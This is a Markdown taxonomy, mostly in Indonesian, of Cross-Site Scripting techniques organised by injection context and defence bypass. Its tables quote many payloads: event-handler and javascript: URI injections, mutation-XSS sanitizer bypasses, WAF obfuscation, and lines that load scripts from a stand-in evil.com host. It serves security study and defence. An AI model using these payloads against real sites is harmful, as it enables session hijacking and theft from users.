---
title: Cross-Site Scripting
description: Vektor mutasi injeksi XSS
---

## Struktur Klasifikasi

Taxonomi ini mengorganisir seluruh permukaan serangan Cross-Site Scripting (XSS) sepanjang tiga sumbu ortogonal:

**Sumbu 1 — Injection Context (Sumbu Utama):** Lokasi struktural dalam dokumen di mana input yang dikontrol attacker di-render atau diinterpretasikan. Ini menentukan parsing rules mana yang berlaku dan bentuk payload mana yang viable. Injection context adalah faktor tunggal paling penting yang mengatur apa yang attacker bisa dan tidak bisa lakukan — payload yang identik berhasil atau gagal tergantung sepenuhnya di mana mereka mendarat.

**Sumbu 2 — Defense Bypass Mechanism (Sumbu Lintas):** Teknik yang digunakan untuk menghindari security control yang berdiri antara input dan eksekusi. XSS modern jarang berhasil melalui direct injection saja; sebaliknya, ia mengeksploitasi discrepancies antara bagaimana defense mem-parse/memvalidasi input dan bagaimana browser menginterpretasikannya. Setiap tipe bypass dapat berlaku di multiple injection context.

**Sumbu 3 — Exploitation Scenario (Sumbu Dampak):** Tindakan post-exploitation yang diambil setelah eksekusi JavaScript tercapai. Ini memetakan teknik ke konsekuensi real-world — dari session hijacking hingga persistent browser-level compromise via service worker.

### Ringkasan Sumbu 2: Tipe Defense Bypass

| Tipe Bypass | Mekanisme | Berlaku Di Seluruh |
|---|---|---|
| **Encoding Differential** | Input di-decode secara berbeda oleh filter vs. browser (URL-encoding, HTML entities, Unicode, double-encoding) | Semua context |
| **Parser Differential** | Sanitizer dan browser tidak setuju pada struktur DOM (mutation XSS, namespace confusion, node flattening) | §1, §2, §7 |
| **WAF Evasion** | Struktur payload menghindari signature/regex detection (parameter pollution, case variation, comment insertion, null bytes) | Semua context |
| **CSP Bypass** | Eksekusi tercapai meskipun ada Content Security Policy (JSONP endpoints, base-uri injection, nonce leakage, unsafe directive, form-action gap, polyglot same-origin scripts, dangling iframe) | §1, §3, §4, §10-3, §11-3 |
| **Sanitizer Bypass** | Input bertahan melalui HTML sanitization library (DOMPurify, Bleach) via mutation, prototype pollution, atau regex flaws | §1, §2, §7 |
| **Framework Bypass** | Mengeksploitasi rendering spesifik framework (React dangerouslySetInnerHTML, Angular template injection, Vue v-html) | §3, §9 |
| **Protocol-Level** | Cookie parsing differentials, CRLF injection, content-type sniffing untuk mencapai script execution | §4, §10 |

### Konsep Fundamental: Browser Parsing Pipeline

XSS secara fundamental mengeksploitasi browser's multi-stage parsing pipeline. Input pengguna melewati:

1. **Network layer** → HTTP headers, Content-Type negotiation, MIME sniffing
2. **HTML parser** → Tokenization, tree construction, error recovery, foreign content (SVG/MathML)
3. **Attribute parser** → Entity decoding, URL resolution, event handler compilation
4. **JavaScript engine** → Eval, Function constructor, template literals, dynamic import
5. **CSS parser** → url() resolution, expression() (legacy), @import
6. **DOM APIs** → innerHTML, document.write, postMessage handler, Trusted Types sink

Setiap transisi antar stage menciptakan potential discrepancy yang dieksploitasi oleh attacker. Taxonomi di bawah ini diorganisir berdasarkan di mana dalam pipeline ini injeksi terjadi.

---

## §1. HTML Element Context

Injeksi ke dalam content area antara HTML tag, di mana attacker dapat memperkenalkan element baru. Ini adalah context XSS paling klasik dan paling dipahami.

### §1-1. Direct Script Tag Injection

Vector paling straightforward: menyuntikkan element `<script>` yang dieksekusi oleh browser.

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Inline script block** | `<script>alert(1)</script>` disisipkan ke dalam page body | Tidak ada tag filtering; CSP mengizinkan `unsafe-inline` atau tidak ada CSP |
| **External script load** | `<script src="https://evil.com/x.js"></script>` memuat remote payload | CSP mengizinkan domain attacker atau menggunakan wildcard `*` |
| **Module import** | `<script type="module">import('https://evil.com/x.js')</script>` | CSP tidak membatasi module import; dynamic `import()` melewati beberapa CSP |
| **Nonce-reuse injection** | Script tag disuntikkan dengan CSP nonce yang ditebak atau bocor | Nonce bersifat static, predictable, atau bocor via CSS attribute selector |
| **Script via XSLT** | `<xsl:script>` atau `<msxsl:script>` dalam konteks XML-processed | Aplikasi memproses input pengguna sebagai XML/XSLT |

### §1-2. Event Handler Element Injection

Menyuntikkan HTML element dengan inline event handler yang fire secara otomatis atau dengan interaksi minimal.

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Auto-firing events** | `<img src=x onerror=alert(1)>`, `<body onload=...>`, `<svg onload=...>` | Element di-render; `onerror` fire pada resource yang sengaja broken |
| **Focus-based auto-fire** | `<input autofocus onfocus=alert(1)>`, `<div contenteditable autofocus onfocus=...>` | Atribut `autofocus` memicu focus tanpa user action |
| **Visibility-based events** | `<div oncontentvisibilityautostatechange=alert(1) style="content-visibility:auto">` | Browser mendukung properti CSS `content-visibility` (vector 2025) |
| **Animation-triggered events** | `<div style="animation:x" onanimationstart=alert(1)>` dengan `@keyframes x {}` | CSS animation didukung; `onanimationstart` fire secara otomatis |
| **Exotic browser events** | `onwebkitplaybacktargetavailabilitychanged` pada `<audio>`/`<video>` (Safari-specific) | Browser Safari; event element media spesifik |
| **Interaction-dependent events** | `onclick`, `onmouseover`, `onpointerdown`, dll. | Memerlukan user interaction (severity lebih rendah, tetapi masih eksploitable) |

### §1-3. Embedded Object Injection

Menyuntikkan element yang memuat external content mampu melakukan script execution.

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **iframe injection** | `<iframe src="javascript:alert(1)">` atau `<iframe srcdoc="<script>alert(1)</script>">` | `srcdoc` melewati beberapa CSP; `javascript:` URI dalam src |
| **object/embed injection** | `<object data="data:text/html,...">`, `<embed src="javascript:...">` | Element legacy sering diabaikan oleh filter |
| **SVG foreignObject** | `<svg><foreignObject><body onload=alert(1)>` | Context rendering SVG mengizinkan embedded HTML via `foreignObject` |
| **frame/frameset javascript: URI** | `<frameset><frame src="javascript:alert(origin)">` — element `<frame>` deprecated menerima `javascript:` URI dalam atribut `src`. Melewati XSS filter yang memblokir element umum (`<script>`, `<iframe>`, `<img>`, `<svg>`) tetapi menghilangkan `<frame>` dari tag pattern mereka. Memerlukan injection point sebelum tag `<body>` | Injection sebelum `<body>`; XSS filter menggunakan tag blocklist yang tidak lengkap; browser mendukung `<frame>` deprecated |
| **input type=image parameter injection** | `<input type="image" src="x" onerror="alert(1)">` — di-render sebagai tombol submit yang juga menambahkan parameter koordinat `.x` dan `.y` saat diklik. Dapat menyuntikkan parameter tambahan via atribut `formaction` atau mengeksploitasi parameter pollution ketika extra param `name.x`/`name.y` tidak diharapkan | Context form; endpoint backend yang sensitive terhadap parameter |
| **base tag hijacking** | `<base href="https://evil.com/">` mengarahkan semua relative URL | Directive `base-uri` CSP tidak ada; relative script path ada di halaman |

---

## §2. HTML Attribute Context

Injeksi ke dalam nilai HTML attribute yang ada, di mana attacker harus keluar dari attribute atau memanfaatkan semantik attribute.

### §2-1. Attribute Value Breakout

Keluar dari attribute saat ini untuk menyuntikkan attribute atau element baru.

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Quote breakout** | Input `" onfocus=alert(1) autofocus="` menutup attribute dan menyuntikkan event handler | Nilai attribute tidak di-entity-encode; karakter quote yang cocok diizinkan |
| **Tag breakout** | Input `"><script>alert(1)</script>` menutup tag sepenuhnya | Tidak ada output encoding pada karakter `<` dan `>` |
| **Backtick breakout (IE)** | Menggunakan `` ` `` sebagai attribute delimiter dalam legacy Internet Explorer | Target menggunakan legacy IE rendering mode |
| **Unquoted attribute injection** | Input `x onfocus=alert(1)` menambahkan attribute baru ketika nilai tidak di-quoted | Server me-render attribute tanpa quotes |

### §2-2. Event Handler Attribute Injection

Menambahkan attribute event-handler ke element yang ada.

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Reflected into existing tag** | Input pengguna direfleksikan sebagai `<div class="[INPUT]">` → suntikkan `" onmouseover=alert(1) x="` | Input mendarat di dalam attribute tag yang ada |
| **Autofocus chaining** | Menyuntikkan `autofocus onfocus=alert(1)` ke dalam element focusable apa pun | Element mendukung autofocus (kebanyakan element dalam browser modern) |
| **tabindex exploitation** | Menambahkan `tabindex=0` untuk membuat element non-focusable menjadi focusable, mengaktifkan `onfocus` | Dikombinasikan dengan `autofocus` untuk auto-triggering |

### §2-3. Special Attribute Semantics

Mengeksploitasi attribute yang memiliki kemampuan eksekusi inheren.

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **href/src javascript: URI** | `<a href="javascript:alert(1)">` | Filter tidak memblokir protokol `javascript:`; user mengklik link |
| **action javascript: URI** | `<form action="javascript:alert(1)"><button>Submit</button></form>` | Atribut `action` form tidak divalidasi |
| **formaction override** | `<button formaction="javascript:alert(1)">` mengganti form action | Button dengan `formaction` di dalam form |
| **data: URI in src** | `<iframe src="data:text/html,<script>alert(1)</script>">` | URI `data:` tidak diblokir |
| **meta refresh injection** | `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">` | Input direfleksikan dalam meta tag; browser mengikuti javascript: dalam refresh |
| **SVG animate href** | `<svg><a><animate attributeName=href values=javascript:alert(1)><text>click</text>` | Context SVG; animation mengubah href menjadi javascript: URI |
| **poster attribute** | `<video poster=javascript:alert(1)>` (dukungan browser terbatas) | Perilaku browser legacy |

### §2-4. Hidden Input dan Meta Tag Exploitation

Mencapai XSS dari injection point yang tampaknya tidak dapat dieksploitasi.

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **accesskey + onclick on hidden input** | `<input type=hidden accesskey=x onclick=alert(1)>` dipicu via Alt+Shift+X | Memerlukan user untuk menekan kombinasi key spesifik (Firefox) |
| **meta tag CSP injection** | Menyuntikkan `<meta http-equiv="Content-Security-Policy" content="...">` untuk melemahkan CSP | Input direfleksikan sebelum CSP meta tag yang ada |

---

## §3. JavaScript Context

Injeksi ke dalam inline atau external JavaScript code, di mana input attacker tertanam dalam script block atau JavaScript string literal.

### §3-1. String Literal Breakout

Keluar dari JavaScript string context untuk menyuntikkan executable code.

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Quote termination** | Input `'; alert(1); '` menutup string dan menyuntikkan statement | Server menanamkan input pengguna dalam JS string tanpa escaping quotes |
| **Template literal injection** | Input `` ${alert(1)} `` di dalam backtick-delimited template literal | Server menggunakan template literals dengan user data |
| **Line terminator injection** | Menggunakan `\u2028` (Line Separator) atau `\u2029` (Paragraph Separator) untuk memecah string | Environment pre-ES2019 di mana ini menghentikan string |
| **Escape sequence manipulation** | Input `\'; alert(1);//` di mana server menambahkan `\` sebelum `'`, menghasilkan `\\'; alert(1);//` | Escaping server menciptakan escaped backslash, membebaskan quote |
| **Script block closure** | Input `</script><script>alert(1)</script>` — HTML parser mengambil prioritas atas JS parser | `</script>` di dalam string literal masih menutup script tag dalam HTML |

### §3-2. Dynamic Code Execution Sink

Input pengguna mencapai JavaScript function yang mengeksekusi string sebagai code.

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **eval() injection** | Input pengguna diteruskan ke `eval(userInput)` | Aplikasi menggunakan eval dengan data yang tidak disanitasi |
| **Function constructor** | `new Function('return ' + userInput)()` | Function yang dikonstruksi secara dinamis |
| **setTimeout/setInterval strings** | `setTimeout('doSomething("' + userInput + '")', 1000)` | String argument ke timer function |
| **document.write()** | `document.write('<div>' + userInput + '</div>')` | Direct DOM write dengan input yang tidak disanitasi |
| **innerHTML assignment** | `element.innerHTML = userInput` | Manipulasi DOM tanpa sanitization |
| **jQuery html()** | `$(selector).html(userInput)` | jQuery convenience method melewati safety text-only |
| **Angular expression** | `{{constructor.constructor('alert(1)')()}}` (AngularJS 1.x) | AngularJS template mengkompilasi input pengguna |
| **Vue template compilation** | Direktif `v-html` atau server-side template mixing | Input pengguna di-render sebagai Vue template |

### §3-3. DOM Source-to-Sink Flow

Client-side XSS di mana DOM source yang dikontrol pengguna mengalir ke dangerous sink tanpa keterlibatan server.

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **location.hash to innerHTML** | `document.getElementById('x').innerHTML = location.hash.slice(1)` | Fragment identifier digunakan sebagai content |
| **location.search to document.write** | URL query parameter ditulis langsung ke DOM | Client-side routing atau parameter handling |
| **document.referrer exploitation** | Referrer URL disuntikkan ke DOM via client-side code | Aplikasi membaca dan me-render referrer |
| **window.name cross-origin** | Attacker mengatur `window.name` di halaman mereka, victim membacanya | Legacy cross-origin data passing via window.name |
| **document.cookie to DOM** | Nilai cookie di-render dalam DOM tanpa encoding | Client-side cookie display/processing |
| **Web Storage to DOM** | Nilai `localStorage`/`sessionStorage` disuntikkan oleh attacker script dan kemudian di-render | Stored DOM XSS via storage yang ter-poison |
| **URL fragment directive** | Mengeksploitasi interaksi Text Fragment API (`#:~:text=`) dengan page script | Script memproses fragment directive |

---

## §4. URL/URI Context

Injeksi ke dalam URL-processing context, mengeksploitasi protocol handler, URL parsing, dan URI scheme interpretation.

### §4-1. Protocol Scheme Injection

Menggunakan executable protocol scheme di mana URL diharapkan.

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **javascript: URI** | `javascript:alert(1)` dalam attribute apa pun yang menerima URL | Protocol scheme tidak difilter; user menavigasi ke link |
| **javascript: with encoding** | `java%0ascript:alert(1)`, `&#106;avascript:`, `\u006Aavascript:` | Filter memeriksa string literal tetapi browser mendecode entity/escape |
| **data: URI with HTML** | `data:text/html,<script>alert(1)</script>` | Scheme `data:` diizinkan dalam context |
| **data: URI base64** | `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` | Base64 encoding menghindari pattern-matching filter |
| **vbscript: (legacy IE)** | `vbscript:MsgBox("XSS")` | Internet Explorer; legacy protocol handler |
| **blob: URI** | Mengkonstruksi Blob URL dengan HTML content yang mengandung script | Aplikasi membuat dan menavigasi ke blob URL |
| **Web Worker context XSS** | XSS di dalam Web Worker (via `new Worker(url)` yang dikontrol attacker atau unsanitized message handler) dieksekusi dalam `WorkerGlobalScope` tanpa DOM access. Jalur eskalasi: same-origin `fetch()` dengan credentials untuk API abuse, `postMessage()` ke parent window (jika parent memiliki unsafe message handler → DOM XSS), manipulasi IndexedDB untuk poison shared storage, dan akses `caches` API untuk Service Worker cache poisoning | Worker source URL atau message handler memproses input yang dikontrol attacker; eskalasi memerlukan unsafe `postMessage` handling di parent atau shared storage dependency |
| **Blob URL drag-and-drop escalation (Chrome)** | Dari Worker-confined XSS: membuat HTML Blob (`new Blob(['<script>...</script>'], {type:'text/html'})`), menghasilkan `blob:` URL via `URL.createObjectURL()`, leak URL secara eksternal via `fetch()`. Halaman attacker mencegat drag event, mengganti `dataTransfer` data dengan blob URL yang bocor. Ketika user melepaskan mouse, blob URL terbuka di tab baru yang mewarisi origin victim — mencapai full DOM XSS. Melewati `ERR_UNSAFE_REDIRECT` dengan menghilangkan hubungan initiator antara origin attacker dan victim | Browser Chrome; Worker XSS tercapai; single user drag interaction diperlukan; attacker dapat host halaman yang menangkap drag events |

### §4-2. URL Parser Differentials

Mengeksploitasi perbedaan dalam bagaimana filter vs. browser mem-parse URL.

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Backslash normalization** | `javascript:\x0aalert(1)` — browser menormalkan whitespace tertentu dalam scheme | Browser-specific whitespace tolerance dalam URL scheme |
| **Tab/newline insertion** | `java\tscript:alert(1)` atau `java\nscript:alert(1)` | Browser mengabaikan control character dalam URL scheme |
| **Null byte truncation** | `javascript:\0alert(1)` — filter melihat null byte, browser mengabaikannya | Null byte handling differential |
| **Authority confusion** | `javascript://example.com/%0aalert(1)` — tampak sebagai comment, dieksekusi setelah newline | Filter melihat "valid URL", browser mengeksekusi JS setelah `//` comment |
| **URL-encoded scheme** | `%6A%61%76%61%73%63%72%69%70%74:alert(1)` | Beberapa context mendecode URL encoding sebelum scheme check |

### §4-3. Redirect-Based XSS

Mengeksploitasi server-side atau client-side redirect untuk mengirim payload XSS.

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Open redirect to javascript:** | Redirect endpoint mengirim `Location: javascript:alert(1)` | Server tidak memvalidasi redirect target scheme |
| **Meta refresh redirect** | `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">` | Input mengontrol meta refresh URL |
| **DOM-based redirect** | `location.href = userInput` atau `window.open(userInput)` | Client-side redirect dengan input yang tidak disanitasi |
| **OAuth fragment leak** | Redirect mempertahankan `#access_token=...` di seluruh 302, readable via `location.hash` | OAuth implicit flow dikombinasikan dengan open redirect |
| **302 response body rendering (Firefox)** | Firefox me-render HTML response body dari 302 redirect response ketika `Content-Type: text/html` diatur, alih-alih secara diam-diam mengikuti `Location` header. Payload XSS dalam redirect response body dieksekusi dalam context origin redirecting — perilaku browser-spesifik yang browser lain tekan dengan membuang redirect body | Browser Firefox; 302 response menyertakan HTML body dengan content yang dikontrol attacker; `Content-Type: text/html` pada redirect response |

---

## §5. CSS Context

> **Bagian ini telah diekstrak ke dalam dokumen terpisah.** Untuk taxonomi CSS injection lengkap — termasuk data exfiltration via attribute selector, font ligatures, CSP nonce leakage, UI manipulation, SVG filter abuse, user tracking, dan legacy script execution vector — lihat dokumen taxonomi **[`css-injection.md`](css-injection.md)**.
>
> Cross-reference kunci dari dokumen ini:
> - CSP nonce leakage via CSS selector → `css-injection.md` §5-1
> - CSS-based data exfiltration (scriptless) → `css-injection.md` §1, §2
> - CSS-to-XSS escalation chain → `css-injection.md` §5-3
> - Legacy script execution (`expression()`, `-moz-binding`, `behavior`) → `css-injection.md` §3

---

## §6. DOM Manipulation Context

Eksploitasi melalui DOM API dan browser-native feature yang membuat atau memodifikasi struktur halaman.

### §6-1. DOM Clobbering

Menimpa JavaScript variable dan API reference dengan menyuntikkan HTML element dengan atribut `id` atau `name` spesifik.

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Global variable clobbering** | `<img id="x">` membuat `window.x` mereferensi element alih-alih JS object yang diharapkan | Aplikasi memeriksa `if (x)` atau membaca `x.y` di mana `x` diharapkan menjadi JS variable |
| **Nested property clobbering** | `<a id=x><a id=x name=y href="javascript:alert(1)">` membuat `x.y` via DOM collection | Aplikasi mengakses `x.y` sebagai URL atau nilai |
| **Form element clobbering** | `<form id=x><input name=y value=evil>` membuat `x.y.value` dikontrol attacker | Aplikasi membaca properti form element |
| **document property clobbering** | `<img name=cookie>` menimpa accessor `document.cookie` | Script mereferensi `document.cookie` setelah clobbering |
| **Clobbering in libraries** | Webpack `import.meta.url`, Google Closure, MathJax gadget ditimpa via DOM clobbering | Property yang dapat di-clobber mengalir ke script-loading sink (497+ gadget teridentifikasi) |

### §6-2. Prototype Pollution to XSS

Mencemari JavaScript object prototype untuk menyuntikkan nilai yang mencapai XSS sink.

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Polluted innerHTML gadget** | `Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'` dikonsumsi oleh code yang membaca undefined property | Operasi merge/clone dengan deep key yang dikontrol attacker |
| **Polluted src/href gadget** | `Object.prototype.src = 'javascript:alert(1)'` digunakan oleh code yang memuat script/link | Library membaca `.src` dari config tanpa assignment eksplisit |
| **Polluted transport_url** | Properti Google Analytics `transport_url` di-pollute untuk mengakses `script.src` sink | GA dimuat dengan default config; prototype pollution source ada |
| **Sanitizer initialization bypass** | `Object.prototype.after` di-pollute sebelum DOMPurify init (CVE-2024-45801) | Prototype pollution terjadi sebelum sanitizer dimuat |
| **Template engine gadgets** | Property yang di-pollute dikonsumsi oleh Handlebars, Pug, atau EJS template compilation | Server-side rendering dengan prototype pollution |
| **Implicit toString/valueOf gadget chain** | Prototype pollution mengatur `Object.prototype.toString` atau `Object.prototype.valueOf` untuk mengembalikan string yang dikontrol attacker. Ketika object yang di-pollute mengalami implicit type coercion (string concatenation, comparison, template literal embedding), method yang di-override menyuntikkan executable content ke sink seperti `innerHTML` atau `document.write` | Implicit type coercion pada object yang di-pollute mencapai DOM write sink; tidak ada explicit property access yang diperlukan |

### §6-3. postMessage Exploitation

Mengeksploitasi cross-origin messaging API untuk XSS.

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Missing origin validation** | Listener melakukan `window.addEventListener('message', (e) => eval(e.data))` tanpa memeriksa `e.origin` | Tidak ada origin check atau wildcard origin |
| **Insufficient origin check** | `if (e.origin.indexOf('trusted.com') > -1)` di-bypass dengan `trusted.com.evil.com` | Validasi origin menggunakan regex/substring |
| **Data to dangerous sink** | postMessage data mengalir ke `innerHTML`, `location.href`, atau `eval()` | Data message yang di-trust dianggap aman |
| **Wildcard targetOrigin** | `parent.postMessage(secret, '*')` leak data ke origin embedding apa pun | Secret dikirim dengan wildcard origin |

---

## §7. Markup Parser Differential Context (Mutation XSS)

Mengeksploitasi perbedaan antara bagaimana HTML sanitizer mem-parse markup dan bagaimana browser merekonstruksinya. Ini adalah kategori XSS paling canggih.

> **Deep-Dive Reference:** Untuk taxonomi komprehensif mekanisme mutasi mXSS — termasuk namespace switching, foster parenting, text content mode confusion, desanitization, nesting depth exploitation, dan pemetaan CVE/bounty lengkap — lihat dokumen taxonomi [`mutation-xss.md`](../05-client-side/mutation-xss.md).

### §7-1. DOM Mutation (mXSS)

Payload yang aman ketika di-parse oleh sanitizer tetapi menjadi berbahaya setelah HTML parser browser merekonstruksi DOM.

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Node flattening** | Element yang sangat nested melebihi browser's nesting limit; browser menghapus inner wrapper, mengekspos payload | DOMPurify ≤ 3.1.0 (2024 bypass); depth threshold bervariasi per browser |
| **Namespace confusion** | Namespace MathML/SVG menyebabkan element di-parse secara berbeda dari yang diharapkan sanitizer | `<math><mtext><table><mglyph><style>` memicu foreign-content parsing rule |
| **Comment node mutation** | Sanitizer memeriksa text node tetapi mengabaikan comment; browser mengkonversi comment content menjadi active DOM setelah mutation | Comment yang mengandung encoded entity dalam context math/SVG |
| **Stack of open elements** | "Adoption agency algorithm" browser merestrukturisasi nesting dengan cara yang tidak dapat diprediksi sanitizer | Element formatting misnested (`<b>`, `<i>`, `<a>`) menyebabkan tree reconstruction |
| **Template element escape** | Content di dalam `<template>` di-parse dalam inert mode oleh sanitizer tetapi diaktifkan ketika dipindahkan ke live DOM | Sanitizer memperlakukan `<template>` content sebagai aman |
| **Regex-based sanitizer bypass** | Regex template literal DOMPurify gagal menangkap edge case (CVE-2025-26791) | Mode `SAFE_FOR_TEMPLATES` dengan SVG edge case |
| **Lexical parser state exploitation (LEXSS)** | Lexer sanitizer menginterpretasikan token boundaries secara berbeda dari tokenizer browser — input yang diklasifikasikan sebagai inert text di-tokenize ulang sebagai executable markup pada tahap pre-DOM lexical analysis | Sanitizer berbasis custom lexer (bukan browser-native DOMParser); tokenizer state machine differential |
| **Nested parser context switching** | Urutan nesting HTML/SVG/MathML menghasilkan DOM tree yang berbeda di sanitizer vs. browser — context-switching rule dalam spesifikasi ambigu pada foreign content transition point, dapat ditemukan melalui systematic parser fuzzing | Multiple foreign content namespace dengan nested transitions (misalnya, `<svg>` di dalam `<math>`) |
| **Element rename/unrename bypass** | Custom sanitizer me-rename element berbahaya (misalnya, `svg` → `proton-svg`) sebelum pemrosesan DOMPurify, kemudian me-rename kembali; siklus rename-unrename mengaktifkan kembali element dan event handler yang dinetralkan sanitizer selama pass-nya (SonarSource, Skiff/Proton Mail, 2023) | Custom pre/post-processing yang membungkus sanitizer; element renaming membalikkan sanitization dari element yang sensitive terhadap namespace |

### §7-2. Encoding-Level Mutation

Payload yang bertransformasi selama character encoding atau entity processing.

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **UTF-7 injection** | `+ADw-script+AD4-alert(1)+ADw-/script+AD4-` diinterpretasikan sebagai UTF-7 | Deklarasi charset tidak ada; legacy browser auto-detection |
| **Double encoding** | `%253Cscript%253E` di-decode dua kali — sekali oleh proxy/WAF, sekali oleh app | Multiple decoding layer dalam request processing |
| **HTML entity nesting** | `&amp;lt;` → `&lt;` → `<` setelah multiple parse pass | Server melakukan entity decoding sebelum output final |
| **Overlong UTF-8** | Non-shortest-form UTF-8 bytes diinterpretasikan secara berbeda oleh filter vs. runtime | Sistem legacy dengan validasi UTF-8 yang longgar |
| **Charset mismatch** | Server mendeklarasikan UTF-8 tetapi content mengandung Shift_JIS sequence yang mengonsumsi karakter quote | Character encoding mismatch antara header dan content |

### §7-3. Content-Type dan MIME Confusion

Menyebabkan browser menginterpretasikan content dalam context MIME yang lebih berbahaya.

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **MIME sniffing** | Browser mengabaikan `Content-Type: text/plain` dan menginterpretasikan content sebagai HTML | Header `X-Content-Type-Options: nosniff` tidak ada |
| **Content-Type via CRLF** | CRLF injection mengatur `Content-Type: text/html` untuk response non-HTML | Kerentanan header injection |
| **SVG as image** | File SVG yang di-upload mengandung `<script>` atau event handler; disajikan dengan `image/svg+xml` | Aplikasi mengizinkan upload SVG; serve dari same origin |
| **Polyglot files** | File valid sebagai image dan HTML; browser me-render sebagai HTML dalam context tertentu | Content-Type negotiation atau MIME sniffing |
| **KML/XML file rendering** | File KML (Keyhole Markup Language) adalah XML-based dan dapat menyematkan `<script>` atau event handler; ketika aplikasi web me-render content KML (misalnya, map widget, geo-data viewer) tanpa sanitization, embedded JavaScript dieksekusi dalam origin aplikasi. Tag name mixed-case (`<ScRiPt>`) melewati keyword blacklist. Wormable ketika KML yang disuntikkan dipropagasikan ke view user lain | Aplikasi me-render user-uploaded KML/GeoXML content; tag-name blacklist bersifat case-sensitive |
| **Content-Type override in cloud storage/CDN** | Cloud object storage (S3, GCS, Azure Blob) menyajikan file yang di-upload user dengan `Content-Type` yang diatur saat upload oleh client yang meng-upload. Jika aplikasi tidak menegakkan Content-Type yang aman saat upload, attacker meng-upload file HTML dengan `Content-Type: text/html` — disajikan langsung dari storage origin atau melalui CDN tanpa re-validasi. Environment serverless/edge (Cloudflare Workers, Lambda@Edge) yang mengkonstruksi response secara dinamis mungkin menghilangkan atau salah mengkonfigurasi Content-Type header, memicu browser MIME sniffing yang mempromosikan text atau JSON yang mengandung markup HTML ke executable HTML context. CDN cache re-serialization juga dapat menghilangkan atau mengganti Content-Type header selama cache storage/retrieval cycle | User-controlled Content-Type saat upload; CDN/storage menyajikan secara langsung tanpa Content-Type override atau `X-Content-Type-Options: nosniff`; shared origin antara user content dan aplikasi (tidak ada subdomain isolation) (Flatt Security, 2024) |
| **Safari Reader Mode re-rendering** | Safari's Reader Mode mengekstrak article content dan me-render ulang melalui pipeline HTML sanitization dan parsing terpisah yang berbeda dari normal rendering path. Payload yang di-strip atau dinetralkan oleh standard browser rendering (misalnya, event handler, `javascript:` URI, custom element construct) bertahan Reader Mode's different extraction dan reconstruction rule, dieksekusi dalam context origin halaman ketika user mengaktifkan Reader Mode | Browser Safari; halaman eligible untuk Reader Mode activation (content article-like yang cukup); struktur payload bertahan Reader Mode extraction pipeline (Nikhil Mittal, 2020) |

---

## §8. WAF/Filter Evasion Techniques

Metode sistematis untuk melewati input validation, output encoding, dan Web Application Firewall. Teknik-teknik ini berlaku di multiple injection context.

### §8-1. Tag dan Keyword Obfuscation

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Case variation** | `<ScRiPt>`, `<SCRIPT>`, `<scRIPT>` | Case-sensitive filter matching |
| **Null byte insertion** | `<scr\x00ipt>` — filter berhenti di null, browser mengabaikannya | Null byte handling differential |
| **Comment insertion** | `<scr<!--comment-->ipt>` atau `<script/x>` | HTML parser error recovery; filter mengharapkan tag yang bersih |
| **Tag name padding** | `<script\t\n\r >` dengan whitespace/control char setelah tag name | Regex cocok dengan exact tag name tanpa whitespace tolerance |
| **Slash substitution** | `<img/src=x/onerror=alert(1)>` — forward slash sebagai attribute separator | HTML parser menerima `/` sebagai whitespace equivalent dalam tag |
| **Rare/custom tags** | `<details open ontoggle=alert(1)>`, `<marquee onstart=alert(1)>` | Filter blocklist tidak mencakup semua HTML element |
| **SVG/MathML tags** | `<svg><script>alert(1)</script></svg>` — foreign element context | Filter tidak memahami foreign content parsing |
| **XSS Auditor weaponization** | Menyuntikkan content yang cocok dengan script yang legitimate memicu block Chrome's XSS Auditor, secara selektif menonaktifkan defense (frame-busters, security logic); perilaku auditor juga berfungsi sebagai XS-Leak content-detection oracle | Chrome < 78 dengan XSS Auditor enabled (historical; berkontribusi pada penghapusan Auditor) |

### §8-2. JavaScript Payload Obfuscation

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **String construction** | `window['al'+'ert'](1)` atau `self[atob('YWxlcnQ=')](1)` | Filter memblokir keyword `alert`, `eval` literal |
| **Template literal execution** | `` alert`1` `` — tagged template literal memanggil function tanpa parentheses | Filter memblokir karakter `(` dan `)` |
| **Arrow function** | `x=>alert(1)` atau `(x=>{alert(1)})()` | Sintaks compact menghindari pattern matching |
| **Constructor chain** | `[].constructor.constructor('alert(1)')()` | Mengakses `Function` constructor tanpa keyword |
| **Unicode escapes in JS** | `\u0061lert(1)` — JS menginterpretasikan Unicode escapes dalam identifier | Filter tidak mendecode JS Unicode escapes |
| **Computed property access** | `window['alert'](1)`, `self['al'+'ert'](1)` | Bracket notation melewati static keyword detection |
| **with statement** | `with(document)body.appendChild(createElement('script')).src='//evil.com'` | Menghindari direct property reference |
| **import() expression** | `import('https://evil.com/x.js')` — dynamic import dalam browser modern | CSP mungkin tidak memblokir dynamic import; menghindari eval |
| **top-level await** | `await import('//evil.com/x.js')` dalam module context | Module context tersedia |

### §8-3. HTTP Parameter Pollution (HPP)

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Payload splitting** | Payload XSS dipecah di seluruh duplicate parameter: `?q=<script>&q=alert(1)&q=</script>` | Server menggabungkan duplicate params (ASP.NET menggabungkan dengan `,`) |
